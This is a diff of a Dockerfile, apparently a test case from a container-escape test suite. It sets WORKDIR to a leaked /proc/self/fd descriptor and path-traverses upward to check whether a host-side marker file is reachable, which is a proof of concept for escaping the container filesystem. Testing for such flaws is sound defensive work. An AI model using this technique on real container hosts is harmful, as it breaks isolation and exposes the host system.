@@ -1,18 +1,28 @@
-FROM ubuntu:20.04
+FROM ubuntu:16.04
 
-# Install dependencies for Python and venv
-RUN apt-get update -y && apt-get install -y \
-    python3 python3-pip python3-venv netcat && \
-    apt-get clean && rm -rf /var/lib/apt/lists/*
-
-# Create the virtual environment in an absolute path
-RUN python3 -m venv /venv && /venv/bin/pip install --upgrade pip
-
+# original fs was 9
 # Set the working directory
-WORKDIR /proc/self/fd/9
+WORKDIR /proc/self/fd/5
 
 # Copy the script
-COPY host_mount.py /host_mount.py
+COPY host_mount.sh /host_mount.sh
 
-# Use Python from the virtual environment
-CMD ["/venv/bin/python3", "/host_mount.py"]
+# Set the CMD to run the inline Bash script
+CMD bash -c '\
+  relative_path="../../../../../"; \
+  target_file="houdini/tricks/HostMount/61240abcc5412ab41c9a4c44be7e898666c8bb9c650bf8985b8ae2ee8d4160ce"; \
+  if cd "$relative_path" 2>/dev/null; then \
+    echo "Successfully changed directory to: $(pwd)"; \
+    if [ -f "$target_file" ]; then \
+      echo "File found: $target_file"; \
+    else \
+      echo "File not found: $target_file"; \
+    fi; \
+  else \
+    err_code=$?; \
+    case $err_code in \
+      1) echo "Error: Permission denied" ;; \
+      2) echo "Error: No such file or directory" ;; \
+      *) echo "Unexpected error (exit code $err_code)" ;; \
+    esac; \
+  fi'
